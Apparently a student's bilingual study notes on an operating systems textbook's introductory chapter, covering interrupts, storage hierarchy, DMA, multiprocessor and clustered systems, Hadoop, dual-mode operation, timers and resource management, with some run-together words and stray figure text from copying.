In summary, interrupts are used throughout modern operating systems to handle asynchronous events. Device controllers and hardware faults raise interrupts. To enable the most urgent work to be done first, modern computers use a system of interrupt priorities. Because interrupts are used so heavily for time-sensitive processing, efficient interrupt handling is required for good system performance.
After I/O starts, control returns to user program only upon I/O completion
Wait instruction idles 空转 the CPU until the next interrupt
Wait loop (contention for memory access)
At most one I/O request is outstanding at a time, no simultaneous I/O
processing
After I/O starts, control returns to user program without waiting for I/O completion
System call – request to the OS to allow user to wait for I/O completion Device-status table contains entry for each I/O device indicating its type,
address, and state
OS indexes into I/O device table to determine device status and to modify
table entry to include interrupt
 Two I/O Methods:
STORAGE DEFINITIONS AND NOTATION
The basic unit of computer storage: bit.
A bit contain one of two values, 0 and 1.
All storage in computer is based on collections of bits.
With enough bits, a computer can represent: numbers, letters, images, movies, sounds, documents, and programs... Example: most computers cannot move a bit but can move a byte.
A less common term is word (a given computer architecture’s native unit of data). A word is made up of one or more bytes.
example, a computer that has 64-bit registers and 64-bit memory addressing typically has 64-bit (8-byte) words.
A computer executes many operations in its native word size rather than a byte at a time.
  - Networking measurements are an exception to this general rule; they are given in bits (because networks move data a bit at a time).
Computer storage generally measured and manipulated in bytes and collections of bytes.
A kilobyte / KB = 1,024 bytes;
a megabyte / MB = 1,0242 bytes; 1 million bytes a gigabyte / GB = 1,0243 bytes; 1 billion bytes
a terabyte / TB = 1,0244 bytes;
a petabyte / PB = 1,0245 bytes.
^ chapter 1.2.2 Storage Structure
Main memory – only large storage media that the CPU can access directly Random access
Typically volatile 不稳定的
Secondary storage – extension of main memory, provides large nonvolatile
storage.
Hard disks – rigid metal or glass platters covered with magnetic recording material
Disk surface is logically divided into tracks, which are subdivided into sectors The disk controller determines the logical interaction between the device and
the computer Solid-state disks – faster than hard disks, nonvolatile Various technologies
Becoming more popular
The CPU can load instructions only from memory, so programs must first be loaded into memory to run.
General-purpose computers run most of their programs from rewritable memory, called Main memory (Random-access memory / RAM).
Main memory commonly is implemented 执行 in a semiconductor 半导体 technology called Dynamic random-access memory / DRAM.
Computers use other forms of memory as well.
Example:
bootstrap program (first program to run on computer power-on, which then loads the operating system)
  - RAM cannot hold the bootstrap program: volatile—loses its content when power is turned off or otherwise lost.
  - for this and some other purposes, the computer uses electrically erasable programmable storage, Read-only memory (EEPROM) and other forms
of firmware 固件 — infrequently written to and is nonvolatile.
  - EEPROM:
  - can be changed but cannot be changed frequently.
  - low speed, contains mostly static programs and data that aren’t
frequently used.
  - Example: iPhone uses EEPROM to store serial numbers and hardware information about the device.
All forms of memory provide an array of bytes.
Each byte has its own address.
Interaction is achieved through a sequence of load/store instructions to specific memory addresses.
The load instruction moves a byte or word from main memory to an internal
register within the CPU,
the store instruction moves the content of a register to main memory.
Aside from explicit loads and stores, the CPU automatically loads instructions 操作 指南 from main memory for execution from the location stored in the program
counter.
A typical instruction 指示 – execution cycle, as executed on a system with a von
Neumann architecture 冯·诺伊曼结构 , first fetches 取得 an instruction from memory and stores that instruction in the instruction register.
The instruction is then decoded and may cause operands 操作数 to be fetched from memory and stored in some internal register.
After the instruction on the operands has been executed, the result may be stored back in memory.
Notice that the memory unit sees only a stream of memory addresses. It does not know how they are generated (by the instruction counter, indexing, indirection, literal addresses, or some other means) or what they are for (instructions or data).
Accordingly, we can ignore how memory address is generated by program.
And interested only in the sequence of memory addresses generated by the running
program.
Ideally, we want the programs and data to reside in main memory permanently. (usually not possible on most systems for two reasons)
1. Main memory: usually too small to store all needed programs and data permanently.
2. Main memory: volatile, loses contents when power is turned off or otherwise lost. Most computer systems use secondary storage as an extension of main memory. (much slower than main memory)
The main requirement for secondary storage: hold large data permanently. The most common secondary-storage devices:
  - Hard-disk drives (HDDs)
  - Nonvolatile 非􏰘发性的 memory (NVM) devices
  - provide storage for both programs and data.
Most programs (system and application) are stored in secondary storage until they are loaded into memory.
Many programs then use secondary storage as both the source and the destination of their processing.
Hence, the proper management of secondary storage is of central importance to a computer system.
The storage system:
Most: consisting of registers, main memory, and secondary storage. tertiary storage: cache memory, CD-ROM or blu-ray, magnetic tapes ...
  - slow enough, large enough
  - used only for special purposes: like store backup copies of material stored on other devices.  Each storage system provides the basic functions of storing a datum and holding that datum until it is retrieved at a later time. The main differences among the various storage systems lie in speed, size, and volatility.
The wide variety of storage systems can be organized in a hierarchy according to storage capacity and access time.
trade-off between size and speed: smaller and faster memory closer to the CPU. volatile or nonvolatile: Volatile, loses contents when the power to the device is
removed, so data must be written to nonvolatile storage for safekeeping.
The top 4 levels of memory in the figure are constructed using semiconductor memory, which consists of semiconductor-based electronic circuits. NVM devices, have several variants but in general are faster than hard disks. The most common form of NVM device is flash memory (smartphones, tablets, long-term storage on laptops, desktops...)
Since storage plays an important role in operating-system structure, we will refer to it
frequently in the text. In general, we will use the following terminology:
Volatile storage: referred simply as memory. If need to emphasize a particular type (like a register), will do so explicitly.
Nonvolatile storage: referred to as NVS. The vast majority of the NVS will be
secondary storage, can be classified into two distinct types:
  - Mechanical: examples, HDDs, optical disks, holographic storage, and
magnetic tape. If need to emphasize a particular type, do so explicitly.   - Larger, cheaper per byte than electrical storage.
  - Electrical: examples, flash memory, FRAM, NRAM, and SSD. Electrical storage will be referred to as NVM. If we need to emphasize a particular type, will do so explicitly.
  - costly, smaller, faster than mechanical storage.
The design of a complete storage system must balance all the factors just discussed:
use only as much expensive memory as necessary
providing as much inexpensive, nonvolatile storage as possible.
Caches can be installed to improve performance where a large disparity in access time / transfer rate exists between two components.
Caching
Important principle, performed in hardware, operating system, software. Information in use copied from slower to faster storage temporarily Faster storage (cache) checked first to determine if information is there
  - If it is, information used directly from the cache (fast)
  - If not, data copied to cache and used there Cache smaller than storage being cached
  - Cache management important design problem
  - Cache size and replacement policy   - ^ chapter 1.2.3 I/O Structure
A large portion of operating system code is dedicated to managing I/O, both because of its importance to the reliability and performance of a system and because of the varying nature of the devices.
Recall from the beginning of this section that a general-purpose computer system consists of multiple devices, all of which exchange data via a common bus.
The form of interrupt-driven I/O described in Section 1.2.1 is fine for moving small amounts of data, but can produce high overhead when used for bulk data movement such as NVS I/O.
To solve this problem, direct memory access (DMA) is used.
Used for high-speed I/O devices able to transmit information at close to memory speeds
After setting up buffers, pointers, and counters for the I/O device, the device controller
transfers an entire block data directly to/from the device buffer storage and main
memory, with no intervention by the CPU.
Only one interrupt per block, tell the device driver that the operation has completed,
rather than the one interrupt per byte generated for low-speed devices.
While the device controller is performing these operations, the CPU is available to accomplish other work.
Some high-end systems use switch rather than bus architecture. On these systems, multiple components can talk to other components concurrently, rather than competing for cycles on a shared bus. In this case, DMA is even more effective. Figure 1.7 shows the interplay of all components of a computer system.  ^ chapter 1.3 Computer-System Architecture
The general structure of computer system.
A computer system can be organized in a number of different ways,
we can categorize roughly according to the number of general-purpose processors used.
DEFINITIONS OF COMPUTER SYSTEM COMPONENTS Processor: physical chip contains one/more CPU.
CPU: hardware that executes instructions.
Core: The basic computation unit of the CPU.
Multicore: Including multiple computing cores on the same CPU. Multiprocessor: Including multiple processors.
Although virtually all systems are now multicore, use CPU when referring to a single computational unit of a computer system, core and multicore when specifically referring to one or more cores on a CPU.
^ chapter 1.3.1 Single-Processor Systems
Many years ago, most computer systems used a single processor (containing one CPU + single processing core)
The one main CPU with its core is capable of executing a general-purpose instruction set, including instructions from processes.
  - The core is the component that executes instructions and registers for storing data locally.
These systems have other special-purpose processors too.
  - may be device-specific processors (disk/keyboard/graphics controllers)
  - All of these special-purpose processors run a limited instruction set and do not run processes.
  - Sometimes, they are managed by the OS, the OS sends them information about their task and monitors their status.
  - Example: a disk-controller microprocessor receives a sequence of requests from the main CPU core and implements its own disk queue and scheduling algorithm.   - Microprocessor in the keyboard converts the keystrokes into codes to be sent to the CPU.
  - This arrangement relieves 解除 the main CPU of the overhead of disk scheduling.
  - In other systems or circumstances, special-purpose processors are low-level components built into the hardware.
  - OS cannot communicate with these processors; they do their jobs autonomously.
  - The use of special-purpose microprocessors is common and does not turn a single-processor system into a multiprocessor.
If there is only one general-purpose CPU with a single processing core, then the system is a single-processor system, very few contemporary computer systems are single- processor systems.
^ chapter 1.3.2 Multiprocessor Systems
On modern computers, multiprocessor systems now dominate the landscape of computing, systems have two/more processors, each with a single-core CPU.
The processors share the computer bus and sometimes the clock, memory, and peripheral devices.
Also known as parallel systems, tightly-coupled systems
Advantage of multiprocessor systems:
The primary advantage: increased throughput 生产量.
  - increase the number of processors, get more work done in less time. N processes can run if there are N CPUs, many processes can run simultaneously.
  - The speed-up ratio with N processors is less than N.
  - When multiple processors cooperate on a task, certain amount of overhead incurred:
  - keeping all the parts working correctly.
  - plus contention for shared resources.
  - lowers the expected gain from additional processors.
Economy of scale
Increased reliability – graceful degradation or fault tolerance
without causing performance to deteriorate 恶化significantly.
 Two types:
Asymmetric Multiprocessing – each processor is assigned a specie task. Symmetric Multiprocessing – each processor performs all tasks The most common multiprocessor systems use symmetric multiprocessing (SMP): each peer CPU processor performs all tasks, including operating-system functions
and user processes.
SMP architecture with two processors.
each CPU processor has its own CPU, own set of registers, and a privat/local cache. However, all processors share physical memory over the system bus.
 Shortcut: separate CPUs, one may be sitting idle while another is overloaded, resulting in inefficiencies.
Inefficiencies can be avoided if the processors share certain data structures.
A multiprocessor system of this form will allow processes and resources (like memory) to be shared dynamically among the various processors and can lower the workload variance among the processors.
multiprocessor has evolved over time and now includes multicore systems multiple computing cores reside on a single chip.
Multicore systems can be more efficient than multiple chips with single cores because on-chip communication is faster than between-chip communication. one chip with multiple cores uses significantly less power than multiple single-core
chips, important issue for mobile devices. Example: dual-core on the same processor chip.
each core has its own register set, and local cache (level 1/ L1 cache).
a level 2 (L2) cache is local to the chip but is shared by the two processing cores.
Most architectures adopt this approach, where local, lower-level caches are generally smaller and faster than higher-level shared caches.
 Aside from architectural considerations, such as cache, memory, and bus contention, a multicore processor with N cores appears to the OS as N standard CPUs.
This characteristic puts pressure on OS designers and application programmers to make efficient use of these processing cores.
Virtually all modern OS—including Windows, macOS, Linux, Android and iOS mobile systems—support multicore SMP systems.
Adding additional CPUs to a multiprocessor system:
will increase computing power
But, the concept does not scale very well
add too many CPUs, contention for the system bus becomes a bottleneck and performance begins to degrade.
Non-uniform memory access / NUMA: provide each CPU (or group of CPUs) with its own local memory that is accessed via a small, fast local bus. The CPUs are connected by a shared system interconnect, so all CPUs share one physical address space.
⁃
  -  Advantage:
faster and no contention over the system interconnect, when CPU accesses its local
memory.
NUMA systems can scale more effectively as more processors are added.
Drawback:
increased latency when a CPU must access remote memory across the system interconnect, create performance penalty.
Example, CPU0 cannot access the local memory of CPU3 as quickly as access its own
local memory, slowing down performance.
Operating systems can minimize this NUMA penalty through careful CPU scheduling
and memory management.
Because NUMA systems can scale to accommodate a large number of processors, becoming increasingly popular on servers and high-performance computing systems.
Finally, blade servers 刀片服务器 are systems in which multiple processor boards, I/O boards, and networking boards are placed in the same chassis.
The difference between these and traditional multiprocessor systems is that each blade- processor board boots independently and runs its own operating system.
Some blade-server boards are multiprocessor as well, which blurs 模糊 the lines between types of computers. In essence, these servers consist of multiple independent multiprocessor systems.
是一种厚度很薄的模块电子电路板。电路板上有一个到两个(或更多)微处理器和 内存。刀片服务器为单个应用程序提供专⻔的服务。多个刀片服务器能够重叠在一 起，方便地插入支架内，充分节省空间。有的产品甚至可以把280个刀片服务器垂 直插入多个支架或并排放入一个落地式贮存柜中。刀片服务器之间共享一条公用高 速总线，使得设备的发热量降低，节省了能源成本。大型数据中心或互联网服务提 供商(ISP)的网站服务器主机一般都采用刀片服务器。
  Blade server有时候也指高密度服务器，它是用于完成某一特定任务的服务器 集群。例如:文件共享、网⻚服务和高速缓存服务、SSL加密、流媒体服务等。
^ chapter 1.3.3 Clustered Systems
Another type of multiprocessor system is a clustered system: athers together multiple CPUs.
Clustered systems differ from the multiprocessor systems
they are composed of two/more individual systems or nodes.
each node is typically a multicore system. Such systems are considered loosely coupled.
The definition of clustered is not concrete; many commercial and open-source packages wrestle to define what a clustered system is and why one form is better than another.
The generally definition: Clustered computers share storage and are closely linked via a local-area network LAN or a faster interconnect (like InfiniBand)
Cluster technology change rapidly. Some cluster products support thousands of systems in a cluster, and clustered nodes that are separated by miles.
Many of these improvements are made possible by storage-area networks (SANs), allow many systems to attach to a pool of storage, sharing storage via a storage-area network (SAN)
If the applications and their data are stored on the SAN, then the cluster software can assign the application to run on any host that is attached to the SAN. If the host fails, then any other host can take over.
In a database cluster, dozens of hosts can share the same database, greatly increasing performance and reliability.  Clustering is usually used to provide high-availability service:
Service will continue even if one/more systems in the cluster fail.
Generally, we obtain high availability by adding a level of redundancy in the system. A layer of cluster software runs on the cluster nodes.
  - Each node can monitor one or more of the others (over the network).
  - If the monitored machine fails, the monitoring machine can take ownership of its storage and restart the applications that were running on the failed machine.
  - The users and clients of the applications see only a brief interruption of service.
High availability provides increased reliability, which is crucial in many applications. The ability to continue providing service proportional to the level of surviving hardware is called graceful degradation. Some systems go beyond graceful degradation and are called fault tolerant, because they can suffer a failure of any single component and still continue operation. Fault tolerance requires a mechanism to allow the failure to be detected, diagnosed, and, if possible, corrected.
Asymmetric clustering:
  - One hot-standby mode host machine does nothing but monitor the
active server.
  - the other is running the applications.
  - If that server fails, the hot-standby host becomes the active server.
Symmetric clustering: has multiple nodes running applications, monitoring each other.
  - Two/more hosts are running applications and are monitoring each other.
  - This structure is more efficient, uses all of the available hardware.
  - However, it does require that more than one application be available to
run.
A clustered system consists of several computer systems connected via a network, can
also be used to provide high-performance computing environments. run an application concurrently on all computers in the cluster.
  - Supply greater computational power than single-processor or SMP systems
The application need written specifically to take advantage of the cluster:
  - Technique: parallelization 平行化, which divides a program into separate components that run in parallel on individual cores in a computer or computers in a cluster.
once each computing node in the cluster has solved its portion of the problem, the results from all the nodes are combined into a final solution.
Other forms of clusters include parallel clusters and clustering over a widearea network (WAN).
Parallel clusters: allow multiple hosts to access the same data on shared storage. most OS lack support for simultaneous data access by multiple hosts
parallel clusters usually require the use of special versions of software and special releases of applications. Example: Oracle Real Application Cluster
a version of Oracle’s database that design to run on parallel cluster.
Each machine runs Oracle, and a layer of software tracks access to the shared disk.
Each machine has full access to all data in the database.
the system must also supply access control and locking to ensure that no conflicting operations occur.
This function, distributed lock manager (DLM), is included in some cluster technology.
536OS: chapter 1.4 Operating-System Operations
Operating system: provides the environment within which programs are executed. is software that manages computer’s hardwarem, software and data resources.
Usually a computer operating system consists of: process management,
maim memory management,
file management,
I/O system management, secondary management and protection system.
1. Computer start running (powered up / rebooted), it runs an initial program.
initial / bootstrap program: simple, stored within the computer hardware in firmware. It initializes the system, from CPU registers to device controllers to memory contents. initial / bootstrap program know how to load the operating system & start executing that system.
  - locate the operating-system kernel and load it into memory.
2. Once the kernel is loaded and executing, it start providing services to the system and
users.
Some services are provided outside of the kernel by system programs that are loaded into memory at boot time to become system daemons 守护进程, which run the entire time the kernel is running.
On Linux, the first system program is “systemd,” and it starts many other daemons.
  - Once this phase is complete, the system is fully booted,
  - Then the system waits for some event to occur.
  - If no processes to execute, no I/O devices to service, and no users to whom to respond, operating system will sit quietly, waiting for something to happen.
Events are almost always signaled by the occurrence of an interrupt.
Another form of interrupt is a trap / exception, a software-generated interrupt caused
by:
by an error (example, division by zero or invalid memory access)
by a specific request from a user program: an operating-system service be performed by executing a special operation called a system call.
HADOOP
Hadoop:
- an open-source software framework
- used for distributed processing of large data sets (big data) in a clustered system containing simple, low-cost hardware components.
Hadoop is designed to scale from a single system to a cluster containing thousands of computing nodes. Tasks are assigned to a node in the cluster, and Hadoop arranges communica- tion between nodes to manage parallel computations to process and coalesce results. Hadoop also detects and manages failures in nodes, providing an efficient and highly reliable distributed computing service.
Hadoop is organized around the following three components:
1. A distributed file system that manages data and files across distributed computing nodes.
2. The YARN (“Yet Another Resource Negotiator”) framework, which manages resources within the cluster as well as scheduling tasks on nodes in the cluster.
3. The MapReduce system, which allows parallel processing of data across nodes in the cluster.
Hadoop is designed to run on Linux systems, and Hadoop applications
can be written using several programming languages, including scripting languages such as PHP, Perl, and Python. Java is a popular choice for developing Hadoop applications, as Hadoop has several Java libraries that support MapReduce. More information on MapReduce and Hadoop can be found at https://hadoop.apache.org/docs/ r1.2.1/mapred tutorial.html and https://hadoop.apache.org
536OS: chapter 1.4.1 Multiprogramming and Multitasking
One of the most important aspects of operating systems is the ability to run multiple programs, as a single program cannot, in general, keep either the CPU or the I/O devices busy at all times. Furthermore, users typically want to run more than one program at a time as well. Multiprogramming increases CPU utilization, as well as keeping users satisfied, by organizing programs so that the CPU always has one to execute. In a multiprogrammed system, a program in execution is termed a process.
The idea is as follows: The operating system keeps several processes in memory simultaneously (Figure 1.12). The operating system picks and begins to execute one of these processes. Eventually, the process may have to wait for some task, such as an I/O operation, to complete. In a non-multiprogrammed system, the CPU would sit idle. In a multiprogrammed system, the operating system simply switches to, and executes, another process. When that process needs to wait, the CPU switches to another process, and so on. Eventually, the first process finishes waiting and gets the CPU back. As long as at least one process needs to execute, the CPU is never idle.
This idea is common in other life situations. A lawyer does not work for only one client at a time, example. While one case is waiting to go to trial or have papers typed, the lawyer can work on another case. If she has enough clients, the lawyer will never be idle for lack of work. (Idle lawyers tend to become politicians, so there is a certain social value in keeping lawyers busy.)
Multitasking is a logical extension of multiprogramming.
the CPU executes multiple processes by switching among them, the switches occur
frequently, providing the user with a fast response time.
when a process executes, it executes only a short time before it either finishes or needs to perform I/O. I/O may be interactive; that is, output goes to a display for the user, and input comes from a user keyboard, mouse, or touch screen. Since interactive I/O typically runs at “people speeds,” it may take a long time to complete. Input, example, may be
max
operating system
process 1
process 2
process 3
process 4 0
Figure 1.12 Memory layout for a multiprogramming system.
24 Chapter 1 Introduction
bounded by the user’s typing speed; seven characters per second is fast for people but incredibly slow for computers. Rather than let the CPU sit idle as this interactive input
       takes place, the operating system will rapidly switch the CPU to another process.
Having several processes in memory at the same time requires some form of memory management, which we cover in Chapter 9 and Chapter 10. In addition, if several processes are ready to run at the same time, the system must choose which process will run next. Making this decision is CPU scheduling, which is discussed in Chapter 5. Finally, running multiple processes concur- rently requires that their ability to affect one another be limited in all phases of the operating system, including process scheduling, disk storage, and memory management. We discuss these considerations throughout the text.
In a multitasking system, the operating system must ensure reasonable response time. A common method for doing so is virtual memory, a tech- nique that allows the execution of a process that is not completely in memory (Chapter 10). The main advantage of this scheme is that it enables users to run programs that are larger than actual physical memory. Further, it abstracts main memory into a large, uniform array of storage, separating logical mem- ory as viewed by the user from physical memory. This arrangement frees programmers from concern over memory-storage limitations.
Multiprogramming and multitasking systems must also provide a file sys- tem (Chapter 13, Chapter 14, and Chapter 15). The file system resides on a secondary storage; hence, storage management must be provided (Chapter 11). In addition, a system must protect resources from inappropriate use (Chapter 17). To ensure orderly execution, the system must also provide mechanisms for process synchronization and communication (Chapter 6 and Chapter 7), and it may ensure that processes do not get stuck in a deadlock, forever waiting for one another (Chapter 8).
1.4.2 Dual-Mode and Multimode Operation
Since the operating system and its users share the hardware and software resources of the computer system, a properly designed operating system must ensure that an incorrect (or malicious) program cannot cause other programs —or the operating system itself—to execute incorrectly. In order to ensure the proper execution of the system, we must be able to distinguish between the execution of operating-system code and user-defined code. The approach taken by most computer systems is to provide hardware support that allows differentiation among various modes of execution.
At the very least, we need two separate modes of operation: user mode and kernel mode (also called supervisor mode, system mode, or privileged mode). A bit, called the mode bit, is added to the hardware of the computer to indicate the current mode: kernel (0) or user (1). With the mode bit, we can distinguish between a task that is executed on behalf of the operating system and one that is executed on behalf of the user. When the computer system is executing on behalf of a user application, the system is in user mode. However, when a user application requests a service from the operating system (via a system call), the system must transition from user to kernel mode to fulfill
1.4 Operating-System Operations 25 user mode
user process
user process executing
Figure 1.13
Transition from user to kernel mode. calls system call return from system call
kernel
trap return mode bit = 0 mode bit = 1 execute system call
the request. This is shown in Figure 1.13. As we shall see, this architectural enhancement is useful for many other aspects of system operation as well.
At system boot time, the hardware starts in kernel mode. The operating system is then loaded and starts user applications in user mode. Whenever a trap or interrupt occurs, the hardware switches from user mode to kernel mode (that is, changes the state of the mode bit to 0). Thus, whenever the operating system gains control of the computer, it is in kernel mode. The system always switches to user mode (by setting the mode bit to 1) before passing control to a user program.
The dual mode of operation provides us with the means for protecting the operating system from errant users—and errant users from one another. We accomplish this protection by designating some of the machine instructions that may cause harm as privileged instructions. The hardware allows privi- leged instructions to be executed only in kernel mode. If an attempt is made to execute a privileged instruction in user
     mode, the hardware does not execute the instruction but rather treats it as illegal and traps it to the operating system.
The instruction to switch to kernel mode is an example of a privileged instruction. Some other examples include I/O control, timer management, and interrupt management. Many additional privileged instructions are discussed throughout the text.
The concept of modes can be extended beyond two modes. example, Intel processors have four separate protection rings, where ring 0 is kernel mode and ring 3 is user mode. (Although rings 1 and 2 could be used for vari- ous operating-system services, in practice they are rarely used.) ARMv8 systems have seven modes. CPUs that support virtualization (Section 18.1) frequently have a separate mode to indicate when the virtual machine manager (VMM) is in control of the system. In this mode, the VMM has more privileges than user processes but fewer than the kernel. It needs that level of privilege so it can create and manage virtual machines, changing the CPU state to do so.
We can now better understand the life cycle of instruction execution in a computer system. Initial control resides in the operating system, where instruc- tions are executed in kernel mode. When control is given to a user applica- tion, the mode is set to user mode. Eventually, control is switched back to the operating system via an interrupt, a trap, or a system call. Most contem- porary operating systems—such as Microsoft Windows, Unix, and Linux—
(mode bit = 1)
kernel mode (mode bit = 0)
26 Chapter 1 Introduction
take advantage of this dual-mode feature and provide greater protection for the
operating system.
System calls provide the means for a user program to ask the operating system to perform tasks reserved for the operating system on the user pro- gram’s behalf. A system call is invoked in a variety of ways, depending on the functionality provided by the underlying processor. In all forms, it is the method used by a process to request action by the operating system. A system call usually takes the form of a trap to a specific location in the interrupt vector. This trap can be executed by a generic trap instruction, although some systems have a specific syscall instruction to invoke a system call.
When a system call is executed, it is typically treated by the hardware as a software
   interrupt. Control passes through the interrupt vector to a service routine in the operating system, and the mode bit is set to kernel mode. The system-call service routine is a part of the operating system. The kernel exam- ines the interrupting instruction to determine what system call has occurred; a parameter indicates what type of service the user program is requesting. Additional information needed for the request may be passed in registers, on the stack, or in memory (with pointers to the memory locations passed in reg- isters). The kernel verifies that the parameters are correct and legal, executes the request, and returns control to the instruction following the system call. We describe system calls more fully in Section 2.3.
Once hardware protection is in place, it detects errors that violate modes. These errors are normally handled by the operating system. If a user program fails in some way— such as by making an attempt either to execute an illegal instruction or to access memory that is not in the user’s address space—then the hardware traps to the operating system. The trap transfers control through the interrupt vector to the operating system, just as an interrupt does. When a program error occurs, the operating system must terminate the program abnormally. This situation is handled by the same code as a user-requested abnormal termination. An appropriate error message is given, and the memory of the program may be dumped. The memory dump is usually written to a file so that the user or programmer can examine it and perhaps correct it and restart the program.
1.4.3 Timer
We must ensure that the operating system maintains control over the CPU. We cannot allow a user program to get stuck in an infinite loop or to fail to call system services and never return control to the operating system. To accomplish this goal, we can use a timer. A timer can be set to interrupt the computer after a specified period. The period may be fixed (example, 1/60 second) or variable (example, from 1 millisecond to 1 second). A variable timer is generally implemented by a fixed-rate clock and a counter. The operating system sets the counter. Every time the clock ticks, the counter is decremented. When the counter reaches 0, an interrupt occurs. For instance, a 10-bit counter with a 1-millisecond clock allows interrupts at intervals from 1 millisecond to 1,024 milliseconds, in steps of 1 millisecond.
Before turning over control to the user, the operating system ensures that the timer is set to interrupt. If the timer interrupts, control transfers automati- cally to the operating system, which may treat the interrupt as a fatal error or
1.5 Resource Management 27 LINUX TIMERS
On Linux systems, the kernel configuration parameter HZ specifies the fre- quency of timer interrupts. An HZ value of 250 means that the timer generates 250 interrupts per second, or one interrupt every 4 milliseconds. The value of HZ depends upon how the kernel is configured, as well the machine type and architecture on which it is running. A related kernel variable is jiffies, which represent the number of timer interrupts that have occurred since the system was booted. A programming project in Chapter 2 further explores timing in the Linux kernel.
may give the program more time. Clearly, instructions that modify the content of the timer are privileged.
1.5 Resource Management
As we have seen, an operating system is a resource manager. The system’s CPU, memory space, file-storage space, and I/O devices are among the resources that the operating system must manage.
1.5.1 Process Management
A program can do nothing unless its instructions are executed by a CPU. A program in execution, as mentioned, is a process. A program such as a compiler is a process, and a word-processing program being run by an individual user on a PC is a process. Similarly, a social media app on a mobile device is a process. For now, you can consider a process to be an instance of a program in execution, but later you will see that the concept is more general. As described in Chapter 3, it is possible to provide system calls that allow processes to create subprocesses to execute concurrently.
A process needs certain resources — including CPU time, memory, files, and I/O devices—to accomplish its task. These resources are typically allocated to the process while it is running. In addition to the various physical and logical resources that a process obtains when it is created, various initialization data (input) may be passed along. example, consider a process running a web browser whose function is to display the contents of a web page on a screen. The process will be given the URL as an input and will execute the appropriate instructions and system calls to obtain and display the desired information on the screen. When the process terminates, the operating system will reclaim any reusable resources.
We emphasize that a program by itself is not a process. A program is a passive entity, like the contents of a file stored on disk, whereas a process is an active entity. A single- threaded process has one program counter specifying the next instruction to execute. (Threads are covered in Chapter 4.) The exe- cution of such a process must be sequential. The CPU executes one instruction of the process after another, until the process completes. Further, at any time, one instruction at most is executed on behalf of the process. Thus, although
28 Chapter 1 Introduction
two processes may be associated with the same program, they are nevertheless considered two separate execution sequences. A multithreaded process has multiple program counters, each pointing to the next instruction to execute for a given thread.
A process is the unit of work in a system. A system consists of a collec- tion of processes, some of which are operating-system processes (those that execute system code) and the rest of which are user processes (those that exe- cute user code). All these processes can potentially execute concurrently—by multiplexing on a single CPU core—or in parallel across multiple CPU cores.
The operating system is responsible for the following activities in connec- tion with process management:
- Creatinganddeletingbothuserandsystemprocesses - SchedulingprocessesandthreadsontheCPUs
- Suspendingandresumingprocesses
- Providingmechanismsforprocesssynchronization
- Providingmechanismsforprocesscommunication
We discuss process-management techniques in Chapter 3 through Chapter 7.
1.5.2 Memory Management
As discussed in Section 1.2.2, the main memory is central to the operation of a modern computer system. Main memory is a large array of bytes, ranging in size from hundreds of thousands to billions. Each byte has its own address. Main memory is a repository of quickly accessible data shared by the CPU and I/O devices. The CPU reads instructions from main memory during the instruction-fetch cycle and both reads and writes data from main memory during the data-fetch cycle (on a von Neumann architecture). As noted earlier, the main memory is generally the only large storage device that the CPU is able to address and access directly. example, for the CPU to process data from disk, those data must first be transferred to main memory by CPU- generated I/O calls. In the same way, instructions must be in memory for the CPU to execute them.
For a program to be executed, it must be mapped to absolute addresses and loaded into
 memory. As the program executes, it accesses program instructions and data from memory by generating these absolute addresses. Eventually, the program terminates, its memory space is declared available, and the next program can be loaded and executed.
To improve both the utilization of the CPU and the speed of the computer’s response to its users, general-purpose computers must keep several programs in memory, creating a need for memory management. Many different memory- management schemes are used. These schemes reflect various approaches, and the effectiveness of any given algorithm depends on the situation. In selecting a memory-management scheme for a specific system, we must take into account many factors—especially the hardware design of the system. Each algorithm requires its own hardware support.
1.5 Resource Management 29 The operating system is responsible for the following activities in connec-
tion with memory management:
Keeping track of which parts of memory are currently being used and which process is using them
Allocatinganddeallocatingmemoryspaceasneeded
Deciding which processes (or parts of processes) and data to move into
and out of memory
Memory-management techniques are discussed in Chapter 9 and Chapter 10.
1.5.3 File-System Management
To make the computer system convenient for users, the operating system provides a uniform, logical view of information storage. The operating system abstracts from the physical properties of its storage devices to define a logical storage unit, the fil . The operating system maps files onto physical media and accesses these files via the storage devices.
File management is one of the most visible components of an operating system. Computers can store information on several different types of physi- cal media. Secondary storage is the most common, but tertiary storage is also possible. Each of these media has its own characteristics and physical orga- nization. Most are controlled by a device, such as a disk drive, that also has its own unique characteristics. These properties include access speed, capacity, data-transfer rate, and access method (sequential or random).
A file is a collection of related information defined by its creator. Com- monly, files represent programs (both source and object forms) and data. Data files may be numeric, alphabetic, alphanumeric, or binary. Files may be free- form (example, text files), or they may be formatted rigidly (example, fixed fields such as an mp3 music file). Clearly, the concept of a file is an extremely general one.
The operating system implements the abstract concept of a file by manag- ing mass storage media and the devices that control them. In addition, files are normally organized into directories to make them easier to use. Finally, when multiple users have access to files, it may be desirable to control which user may access a file and how that user may access it (example, read, write, append).
The operating system is responsible for the following activities in connec- tion with file management:
- Creatinganddeletingfiles
- Creatinganddeletingdirectoriestoorganizefiles
- Supportingprimitivesformanipulatingfilesanddirectories •
Mappingfilesontomassstorage
- Backingupfilesonstable(nonvolatile)storagemedia
30 Chapter 1 Introduction
File-management techniques are discussed in Chapter 13, Chapter 14, and
Chapter 15.
1.5.4 Mass-Storage Management
As we have already seen, the computer system must provide secondary storage to back up main memory. Most modern computer systems use HDDs and NVM devices as the principal on-line storage media for both programs and data. Most programs—including compilers, web browsers, word processors, and games—are stored on these devices until loaded into memory. The programs then use the devices as both the source and the destination of their processing. Hence, the proper management of secondary storage is of central importance to a computer system. The operating system is responsible for the following activities in connection with secondary storage management: - Storageallocation - Diskscheduling
- Partitioning - Protection
Because secondary storage is used frequently and extensively, it must be used efficiently. The entire speed of operation of a computer may hinge on the speeds of the secondary storage subsystem and the algorithms that manipulate that subsystem.
At the same time, there are many uses for storage that is slower and lower in cost (and sometimes higher in capacity) than secondary storage. Backups of disk data, storage of seldom-used data, and long-term archival storage are some examples. Magnetic tape drives and their tapes and CD DVD and Blu-ray drives and platters are typical tertiary storage devices.
Tertiary storage is not crucial to system performance, but it still must be managed. Some operating systems take on this task, while others leave tertiary-storage management to application programs. Some of the functions that operating systems can provide include mounting and unmounting media in devices, allocating and freeing the devices for exclusive use by processes, and migrating data from secondary to tertiary storage.
Techniques for secondary storage and tertiary storage management are discussed in Chapter 11.
1.5.5 Cache Management
Caching is an important principle of computer systems. Here’s how it works. Information is normally kept in some storage system (such as main memory). As it is used, it is copied into a faster storage system—the cache—on a tem- porary basis. When we need a particular piece of information, we first check whether it is in the cache. If it is, we use the information directly from the cache.
1.5 Resource Management 31
      Level Name Typical size
Implementation technology
Access time (ns) Bandwidth (MB/sec)
1
